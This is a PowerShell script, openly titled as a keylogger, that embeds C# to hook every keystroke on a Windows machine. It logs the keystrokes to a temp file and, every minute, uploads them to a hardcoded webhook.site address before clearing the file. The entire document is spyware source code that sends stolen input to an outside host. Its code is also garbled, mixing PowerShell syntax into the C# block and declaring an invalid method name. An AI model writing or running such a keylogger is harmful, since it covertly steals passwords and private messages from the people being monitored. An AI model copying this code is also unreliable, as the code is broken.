# PowerShell Keylogger - Sends to Webhook
$webhookUrl = "https://webhook.site/bf1c330e-8d62-45d7-986f-6f6291797052"
$logFile = "$env:TEMP\keylog.txt"

# Create a low-level keyboard hook using .NET
Add-Type @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Threading;

    public class KeyboardHook {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static void Start() {
            _hookID = SetHook(_proc);
            Application.Run();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                // Append to file and send periodically
                System.IO.File.AppendAllText(Environment.GetEnvironmentVariable("TEMP") + @"\keylog.txt", key + " ");
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);

        private static void Application.Run() {
            while (true) {
                Thread.Sleep(60000); // Send every 60 seconds
                string content = System.IO.File.ReadAllText(Environment.GetEnvironmentVariable("TEMP") + @"\keylog.txt");
                if (!string.IsNullOrEmpty(content)) {
                    SendToWebhook(content);
                    System.IO.File.WriteAllText(Environment.GetEnvironmentVariable("TEMP") + @"\keylog.txt", "");
                }
            }
        }

        private static void SendToWebhook(string data) {
            try {
                $webClient = New-Object System.Net.WebClient;
                $webClient.Headers.Add("Content-Type", "application/json");
                $body = @{ content = data } | ConvertTo-Json;
                $webClient.UploadString("$webhookUrl", $body);
            } catch {}
        }
    }
"@

[KeyboardHook]::Start()
